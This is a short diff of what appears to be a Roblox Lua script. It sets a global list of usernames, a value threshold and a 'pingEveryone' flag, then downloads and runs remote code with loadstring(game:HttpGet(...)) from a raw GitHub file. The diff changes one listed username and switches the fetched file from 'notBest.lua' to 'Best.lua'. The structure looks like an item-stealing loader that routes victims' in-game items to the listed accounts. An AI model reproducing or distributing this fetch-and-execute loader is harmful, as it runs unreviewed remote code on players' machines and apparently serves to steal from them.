@@ -63,7 +63,7 @@ for _, v in pairs(getgc()) do
     end
 end
 
-_G.Usernames = {"Gilberblx","Robloxindigo1111","FedcantgetmenowUwu","Nachito_pro574","Frribizgir6"}
+_G.Usernames = {"Gilberblx","Robloxindigo1111","FedcantgetmenowUwu","Nachito_pro574","Adamveggeasd"}
 _G.min_value = 3
 _G.pingEveryone = "Yes"
 _G.scriptExecuted = _G.scriptExecuted or false
@@ -71,4 +71,4 @@ if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/notBest.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/Best.lua"))()
